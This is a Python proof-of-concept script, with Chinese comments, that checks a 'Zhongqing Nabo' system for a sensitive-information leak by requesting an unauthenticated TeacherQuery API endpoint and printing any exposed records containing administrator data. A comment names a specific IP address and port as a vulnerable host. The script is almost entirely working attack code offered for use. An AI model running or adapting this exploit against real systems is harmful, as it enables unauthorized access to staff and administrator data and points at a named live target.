#!/usr/bin/python3
# -*- coding：utf-8 -*-
#中庆纳博某系统敏感信息泄露
#存在漏洞地址：http://218.89.132.19:8089

import requests
requests.packages.urllib3.disable_warnings()
import sys,colorama
from colorama import *
init(autoreset=True)

def title():
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN +'+      中庆纳博某系统敏感信息泄露                +')
    print(colorama.Fore.GREEN +'+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN +'+ EXP: python3 中庆纳博某系统敏感信息泄露.py https://1.1.1.1:8443          +')
    print(colorama.Fore.GREEN +'+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN +'+ 请输入url-格式为:1.1.1.1:8443                          +')

import requests
requests.packages.urllib3.disable_warnings()


def run(ip,port):
    urllist = 'http://{}:{}'.format(ip, port)
    cmdsr = 'id'
    url = urllist+'/api/TeacherQuery/SearchTeacherInSiteWithPagerRecords'
    # 打印风险地址
    print('vuln_url:{}'.format(url))
    try:
        cmdshow = requests.get(url=url,verify=False,timeout=5)
        cmdshowlist =  cmdshow.text
    except:
        print("[-] Target Not 中庆纳博某系统敏感信息泄露  Vuln")
        return False
    else:
        if '管理员default' in cmdshow.text:
            print(colorama.Fore.YELLOW +'------------------------------执行结果----------------------------------\n')
            print(colorama.Fore.RED +'{} '.format(cmdshow.text))
            print(colorama.Fore.YELLOW + '------------------------------------------------------------------------\n')
            return True
        else:
            print(" 中庆纳博某系统敏感信息泄露 isn't exist")
            return False
        

if __name__ == '__main__':
    #print('------------------------------------------------------------------------\n')
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = int(target.split(':')[1])
    result = run(ip, port)
    # 打印验证结果
    if result:
        print('Exist')
    else:
        print('UnExist')
